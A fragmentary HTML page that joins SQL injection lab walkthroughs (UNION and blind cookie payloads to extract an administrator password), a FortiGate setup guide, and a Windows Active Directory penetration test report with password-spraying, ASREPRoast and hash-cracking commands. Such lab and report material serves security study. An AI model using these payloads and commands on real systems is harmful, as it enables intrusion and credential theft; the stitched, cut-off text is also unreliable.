&lt;ul&gt;
&lt;li&gt;Open Burp Suite and configure it to intercept HTTP requests.&lt;/li&gt;
&lt;li&gt;Navigate to the page where the product category filter is applied.&lt;/li&gt;
&lt;li&gt;Initiate the action to set the product category filter.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Modifying the Request:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;In Burp Suite, intercept the request that sets the product category filter.&lt;/li&gt;
&lt;li&gt;Modify the &lt;code&gt;category&lt;/code&gt; parameter in the intercepted request.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exploiting the SQL Injection Vulnerability:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Change the value of the &lt;code&gt;category&lt;/code&gt; parameter to &lt;code&gt;&#39; OR 1=1--&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This modification introduces a SQL injection payload into the SQL query executed by the application.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Submitting the Request:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Forward the modified request from Burp Suite to the vulnerable application.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Verifying the Results:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Observe the response from the application.&lt;/li&gt;
&lt;li&gt;Verify that the response now contains one or more unreleased products, indicating successful exploitation of the SQL injection vulnerability.&lt;/li&gt;
&lt;li&gt;Note: The unreleased products are displayed despite the intended restriction imposed by the &lt;code&gt;released = 1&lt;/code&gt; condition in the original SQL query.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;li&gt;&lt;strong&gt;Performing a SQL Injection UNION Attack:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Modify the &lt;code&gt;category&lt;/code&gt; parameter with a payload like &lt;code&gt;&#39;+UNION+SELECT+NULL--&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Observe that an error occurs, indicating that the number of columns in the original query does not match the number of columns in the injected query.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Determining the Number of Columns:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Modify the &lt;code&gt;category&lt;/code&gt; parameter to add an additional column containing a null value: &lt;code&gt;&#39;+UNION+SELECT+NULL,NULL--&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Continue adding null values until the error disappears and the response includes additional content containing the null values.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Verifying the Number of Columns:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Count the number of columns in the response that contain null values.&lt;/li&gt;
&lt;li&gt;This number represents the total number of columns returned by the query.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Determining the Number of Columns:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Modify the &lt;code&gt;category&lt;/code&gt; parameter with a payload like &lt;code&gt;&#39;+UNION+SELECT+NULL,NULL,NULL--&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Verify that the query is returning three columns.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Injecting Specified Value:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Replace each &lt;code&gt;NULL&lt;/code&gt; value with the specified random value provided by the lab, for example: &lt;code&gt;&#39;+UNION+SELECT+&#39;abcdef&#39;,NULL,NULL--&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If an error occurs, try replacing each &lt;code&gt;NULL&lt;/code&gt; value with the next specified random value provided by the lab.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Identifying the Compatible Column:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Observe the application&amp;rsquo;s response to determine which column accepts the injected value without causing an error.&lt;/li&gt;
&lt;li&gt;This column is compatible with string data and can be used for further exploitation.&lt;/li&gt;

&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify that the condition is true, confirming the existence of the user administrator.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Determining the Password Length:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Change the TrackingId cookie to:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TrackingId=&amp;lt;id&amp;gt;&amp;#39; AND (SELECT &amp;#39;a&amp;#39; FROM users WHERE username=&amp;#39;administrator&amp;#39; AND LENGTH(password)&amp;gt;1)=&amp;#39;a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify that the condition is true, confirming that the password is greater than 1 character in length.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Send a series of follow-up values to test different password lengths using Burp Intruder.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Determining the Password Characters:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Use Burp Intruder to send suitable payloads to test the character at each position of the password.&lt;/li&gt;
&lt;li&gt;Launch the attack by clicking the &amp;ldquo;Start attack&amp;rdquo; button or selecting &amp;ldquo;Start attack&amp;rdquo; from the Intruder menu.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Logging in as Administrator:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Once the password characters are determined, log in as the administrator user using the obtained password.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;lab-12-blind-sql-injection-with-conditional-errors&#34;&gt;Lab 12: Blind SQL Injection with Conditional Errors
&lt;/h1&gt;&lt;h2 id=&#34;lab-objective-11&#34;&gt;Lab Objective:
&lt;/h2&gt;&lt;p&gt;The objective of this lab is to demonstrate the exploitation of a blind SQL injection vulnerability to retrieve the password of the administrator user. By manipulating the tracking cookie value and observing the application&amp;rsquo;s response to different conditions, we can infer information about the database structure and extract the password character by character.&lt;/p&gt;
&lt;h2 id=&#34;tools-used&#34;&gt;Tools Used:
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Burp Suite:&lt;/strong&gt; Used for intercepting and modifying HTTP requests.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Browser:&lt;/strong&gt; Used for accessing the vulnerable web application.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;lab-procedure-11&#34;&gt;Lab Procedure:
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Accessing the Lab:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Visit the front page of the shop and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Let&amp;rsquo;s say the original value of the cookie is &lt;code&gt;TrackingId=&amp;lt;id&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exploiting the Blind SQL Injection Vulnerability:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Modify the TrackingId cookie, appending a single quotation mark to it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TrackingId=&amp;lt;id&amp;gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify that an error message is received.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change the TrackingId cookie to two quotation marks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TrackingId=&amp;lt;id&amp;gt;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify that the error disappears, indicating a syntax error.&lt;/p&gt;
&lt;/li&gt;

&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TrackingId=&amp;lt;id&amp;gt;&amp;#39;||(SELECT &amp;#39;&amp;#39; FROM dual)||
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify that no error is received, indicating the use of Oracle database.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;

&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TrackingId=&amp;lt;id&amp;gt;&amp;#39;||(SELECT &amp;#39;&amp;#39; FROM not-a-real-table)||
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Receive an error, confirming the processing of injection as a SQL query.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Verify the existence of the users table:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;

&lt;p&gt;Configure the FortiGate&amp;rsquo;s network interfaces based on your network topology and requirements. Set IP addresses, subnet masks, and gateway information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1: Accessing the FortiGate Web Interface&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Connect a computer to the FortiGate using an Ethernet cable.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Log in with the administrator credentials. (username = admin &amp;amp; password = “blank”)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 2: Interface Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Interfaces.&amp;rdquo;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Configure the interfaces based on your network topology:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Internal interfaces (LAN): Assign IP addresses and subnet masks to LAN interfaces connecting to internal networks.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;External interfaces (WAN): Configure the WAN interface that connects to the internet or external network.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DMZ interfaces: If applicable, configure any demilitarized zone (DMZ) interfaces.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 3: IP Address Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;For the WAN interface, set the IP address provided by your ISP or configure it as per your network requirements. Choose between DHCP or static IP address based on your ISP&amp;rsquo;s settings.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For LAN interfaces, assign IP addresses and subnet masks to match your internal network addressing scheme.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 4: Default Gateway Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Configure the default gateway on the FortiGate to point to the next-hop gateway provided by your ISP for the WAN interface.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For LAN interfaces, the default gateway is usually FortiGate&amp;rsquo;s own IP address on the corresponding interface.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 5: DNS Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Set up DNS servers to resolve domain names. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DNS&amp;rdquo; and enter the IP addresses of your preferred DNS servers.&lt;/li&gt;
&lt;/ol&gt;

&lt;ol&gt;
&lt;li&gt;If you have multiple subnets or need to direct traffic to specific destinations, configure static routes. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Static Routes&amp;rdquo; and define the destination subnet and gateway.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 7: DHCP (if needed)&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;If you want the FortiGate to act as a DHCP server for your LAN, go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DHCP&amp;rdquo; and configure the DHCP server settings, including IP address range, lease time, and DNS servers to be provided to clients.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 8: Firewall Policies (optional)&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;If you need to allow or block traffic between different interfaces or subnets, set up firewall policies. Go to &amp;ldquo;Policy &amp;amp; Objects&amp;rdquo; to &amp;ldquo;IPv4 Policy&amp;rdquo; and create the necessary policies.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 9: Apply Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Review your settings and click &amp;ldquo;Apply&amp;rdquo; to save the changes.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Connect a computer to the FortiGate using an Ethernet cable.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Log in with the administrator credentials.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 2: WAN Interface Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Interfaces.&amp;rdquo;&lt;/p&gt;

&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Choose the &amp;ldquo;Static&amp;rdquo; or &amp;ldquo;DHCP&amp;rdquo; option, depending on how your ISP provides the WAN IP address:&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Static IP: If your ISP provides a static public IP address, select &amp;ldquo;Static&amp;rdquo; and enter the IP address, subnet mask, default gateway, and DNS server addresses provided by your ISP.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DHCP: If your ISP uses DHCP to dynamically assign the WAN IP address, select &amp;ldquo;DHCP&amp;rdquo; for the WAN interface. The FortiGate will automatically obtain the IP address, subnet mask, default gateway, and DNS servers from the ISP.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 3: PPPoE Configuration (if needed)&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;If your ISP requires PPPoE (Point-to-Point Protocol over Ethernet) authentication, select &amp;ldquo;PPPoE&amp;rdquo; for the WAN interface and enter the PPPoE username and password provided by your ISP.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 4: Additional WAN Settings (if needed)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Depending on your network setup and ISP requirements, you may need to configure additional settings like MTU (Maximum Transmission Unit), VLAN (Virtual LAN), or link speed/duplex mode for the WAN interface. Consult your ISP or network administrator for specific requirements.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 5: DNS Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Set up DNS servers to resolve domain names. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DNS&amp;rdquo; and enter the IP addresses of your preferred DNS servers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 6: Apply Configuration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Review your settings and click &amp;ldquo;Apply&amp;rdquo; to save the changes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Firewall Policies:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Set up firewall policies to control traffic between different network segments and the internet. Define rules for allowing or blocking specific services and applications.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 1: Accessing the FortiGate Web Interface&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Connect a computer to the FortiGate using an Ethernet cable.&lt;/p&gt;
&lt;p&gt;Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p&gt;
&lt;p&gt;Log in with the administrator credentials.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2: Creating Firewall Policies&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&#34;1-executive-summary&#34;&gt;1. Executive Summary
&lt;/h2&gt;&lt;p&gt;The objective of the penetration test was to thoroughly assess the security of the Windows Server 2016 environment and Active Directory configuration, aiming to identify potential vulnerabilities exploitable by attackers. Various attack scenarios, including brute force attacks, password spraying attacks, ASREPRoast attacks, SQL injection attacks, and command injection attacks, were simulated to uncover critical weaknesses in the system.&lt;/p&gt;
&lt;p&gt;Upon examination of the Windows Server 2016 setup, default configurations and delayed application of crucial security patches were discovered, leaving the system vulnerable to known exploits. Additionally, weaknesses in the Active Directory configuration were noted, such as weak password policies, inadequate access controls, and insufficient segregation of duties, increasing the risk of unauthorized access.&lt;/p&gt;
&lt;p&gt;The findings highlight the urgent need for comprehensive remediation measures to strengthen the organization&amp;rsquo;s security posture. Recommendations include prioritizing regular patching and updates, enforcing robust password policies, reviewing and reinforcing least privilege access controls, implementing effective network segmentation, and conducting frequent security awareness training for employees.&lt;/p&gt;
&lt;p&gt;Implementing these recommendations will significantly improve the organization&amp;rsquo;s security posture, reducing the likelihood of cyber threats and protecting its assets, reputation, and stakeholder confidence.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2-introduction&#34;&gt;2. Introduction
&lt;/h2&gt;&lt;p&gt;The goal of this penetration test was to evaluate Windows Server 2016 security in detail using an Active Directory environment that mimics a standard business infrastructure. Finding weaknesses and possible attack routes was the main goal in order to offer detailed suggestions for strengthening the security posture as a whole.&lt;/p&gt;
&lt;p&gt;In the digital and linked world of today, businesses mostly depend on technological infrastructure to run their operations effectively. For enterprises looking to create a reliable and scalable network infrastructure, Windows Server 2016 together with Active Directory is a popular option. To reduce possible risks, enterprises must constantly assess and improve the infrastructure&amp;rsquo;s security due to the growing sophistication of cyberattacks.&lt;/p&gt;
&lt;p&gt;Our objectives in doing this penetration test were to mimic actual attack scenarios and evaluate how resilient the Windows Server 2016 setup and Active Directory configuration were to different online threats. We sought to find flaws and vulnerabilities that may be used by bad actors to obtain unauthorized access, tamper with data integrity, or interfere with company operations using a combination of automated and human methods.&lt;/p&gt;
&lt;p&gt;The firm will be able to improve its overall security posture by prioritizing repair activities, implementing efficient security controls, and making well-informed decisions about security investments thanks to the data gathered from this penetration test. The company may strengthen its defenses against cyberattacks and preserve the confidence of its stakeholders, assets, and reputation by promptly resolving vulnerabilities that are found and putting the suggested security measures into place.&lt;/p&gt;
&lt;p&gt;In order to help the company mitigate risks and strengthen its security posture, we will offer comprehensive findings, analysis, and suggestions based on our evaluation throughout this report.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;3-scope&#34;&gt;3. Scope
&lt;/h2&gt;&lt;p&gt;The scope of this penetration test included:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Setting up a Windows Server 2016 environment:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Creating and configuring a Windows Server 2016 environment with default settings to simulate a standard deployment scenario.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Configuring Active Directory to simulate a corporate network:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Configuring Active Directory (AD) services to replicate a corporate network environment, including organizational units, user accounts, group policies, and other AD objects.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Executing a minimum of five distinct attacks targeting the Windows Server environment:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Executing at least five different attack scenarios, covering common vectors such as Brute Force Attack, Password Spraying Attack, ASREPRoast Attack, SQL Injection Attack, Command Injection Attack.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Utilizing BloodHound for reconnaissance and privilege escalation:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Using BloodHound, a tool for analyzing Active Directory attack paths, to conduct reconnaissance and identify potential attack paths within the Active Directory environment, as well as to assess opportunities for privilege escalation.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-methodology&#34;&gt;4. Methodology
&lt;/h2&gt;&lt;p&gt;The penetration test employed a blend of manual and automated techniques to simulate real-world attack scenarios. Manual techniques involve the use of human expertise to identify and exploit vulnerabilities in the system, while automated techniques leverage specialized tools and scripts to rapidly scan for and exploit known vulnerabilities.&lt;/p&gt;
&lt;p&gt;Various attack vectors were explored and exploited to evaluate the robustness of the system&amp;rsquo;s defenses. This included but was not limited to, network-based attacks such as port scanning, service enumeration, and exploitation of software vulnerabilities.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;5-findings&#34;&gt;5. Findings

&lt;li&gt;&lt;code&gt;crackmapexec smb 192.168.85.3&lt;/code&gt;: Initiates CrackMapExec to target the SMB protocol on the specified IP address.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;d server.web&lt;/code&gt;: Specifies the domain name for authentication.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;u username.txt&lt;/code&gt;: Provides a file containing usernames for the attack.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p Password@123&lt;/code&gt;: Sets the password to be used during the attack.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-continue-on-success&lt;/code&gt;: Instructs the tool to continue the attack even after successful authentication attempts.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The provided screenshot below illustrates the output of the password spraying attack using CrackMapExec, revealing insights into successful authentication attempts and discovered credentials.&lt;/p&gt;
&lt;p&gt;Instead of trying multiple passwords for a single username, try a single password across multiple usernames. This reduces the risk of account lockouts and increases the likelihood of success.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;533-asreproast-attack&#34;&gt;5.3.3 Asreproast attack
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The ASREPRoast attack utilizes tools such as &lt;strong&gt;&lt;code&gt;GetNPUsers.py&lt;/code&gt;&lt;/strong&gt; from the Impacket toolkit to request AS_REP messages containing encrypted ticket-granting service (TGS) tickets for vulnerable Active Directory user accounts. These messages are then captured and cracked offline using password-cracking tools like John the Ripper or Hashcat, revealing plaintext passwords. This attack leverages weaknesses in authentication mechanisms to compromise user accounts within the domain, demonstrating a significant security risk in Active Directory environments.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Command:&lt;/strong&gt; &lt;code&gt;python3 GetNPUser.py [server.web/](http://server.web/) -userfile ../../username.txt -format hashcat -outputfile hashes.asreproast&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In this specific command:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;python3 GetNPUser.py&lt;/code&gt;&lt;/strong&gt;: Executes the Python script &lt;strong&gt;&lt;code&gt;GetNPUser.py&lt;/code&gt;&lt;/strong&gt; for performing the attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;server.web/&lt;/code&gt;&lt;/strong&gt;: Specifies the target Active Directory domain for the attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;userfile ../../username.txt&lt;/code&gt;&lt;/strong&gt;: Specifies the path to a file containing a list of usernames to target within the domain.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;format hashcat&lt;/code&gt;&lt;/strong&gt;: Specifies the output format for the captured hashes, compatible with Hashcat for offline cracking.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;outputfile hashes.asreproast&lt;/code&gt;&lt;/strong&gt;: Specifies the output file name for storing the captured hashes in the ASREPRoast attack format.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&gt;&lt;/p&gt;
&lt;p&gt;The ASREPRoast attack was successfully executed against the domain &lt;strong&gt;&lt;code&gt;server.web&lt;/code&gt;&lt;/strong&gt;. The Impacket toolkit was used with the &lt;strong&gt;&lt;code&gt;GetNPUser.py&lt;/code&gt;&lt;/strong&gt; script to retrieve AS-REP hashes for users within the domain.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Cracking the Hashes&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Command: &lt;code&gt;john -w=password_kerb.txt hashs.txt&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In this specific command:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;john&lt;/code&gt;&lt;/strong&gt;: Refers to the John the Ripper password cracking tool.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;w=password_kerb.txt&lt;/code&gt;&lt;/strong&gt;: Specifies the wordlist file (&lt;strong&gt;&lt;code&gt;password_kerb.txt&lt;/code&gt;&lt;/strong&gt;) containing potential passwords.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;hashs.txt&lt;/code&gt;&lt;/strong&gt;: Represents the file containing hashed passwords obtained from the ASREPRoast attack.&lt;/li&gt;
&lt;li&gt;The command aims to crack the hashes in &lt;strong&gt;&lt;code&gt;hashs.txt&lt;/code&gt;&lt;/strong&gt; using the passwords from &lt;strong&gt;&lt;code&gt;password_kerb.txt&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;

&gt;
